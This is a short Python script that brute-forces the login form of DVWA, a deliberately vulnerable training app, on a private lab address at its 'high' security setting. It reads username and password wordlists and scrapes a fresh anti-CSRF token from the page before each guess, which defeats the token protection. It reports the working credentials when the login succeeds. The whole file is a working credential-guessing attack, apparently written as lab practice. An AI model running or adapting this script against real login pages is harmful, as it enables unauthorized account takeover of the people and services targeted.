import requests
from bs4 import BeautifulSoup
import os


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': "gzip,deflate",
    'cookie': 'security=high; PHPSESSID=jf651ahrs0tv701vqmvvvor8a2'
}

with open("admin.txt",'r',encoding="utf-8") as fp1:
    if fp1 ==0:
        print("open file error")
    aa = fp1.read().splitlines()
    #print(aa)
with open("password.txt",'r') as fp2:
    if fp2==0:
        print("open file error")
    bb=fp2.read().splitlines()
    #print(bb)
def get_token(headers):
    url = "http://192.168.102.140/DVWA-2.0.1/vulnerabilities/brute/index.php"
    response1 = requests.get(url, headers=headers)  # 访问首页
    soup1 = BeautifulSoup(response1.text, "lxml")
    rt = soup1.find_all(type="hidden")
    token = rt[0].attrs["value"]
    return token
for k in aa:
    for g in bb:
        token=get_token(headers)
        brute_url=f'http://192.168.102.140/DVWA-2.0.1/vulnerabilities/brute/index.php?username={k}&password={g}&Login=Login&user_token={token}#'
        # params = {'username':k, 'password': g, 'Login': 'Login', 'user_token': token}
        response2=requests.get(brute_url,headers=headers)
        print(brute_url)
        print(k,g,token)
        if 'hackable' in response2.text:
            print('\nBingo 爆破成功')
            print(response2.text)

            print(f'username:{k} \npassword:{g}\n')
            os._exit(0)

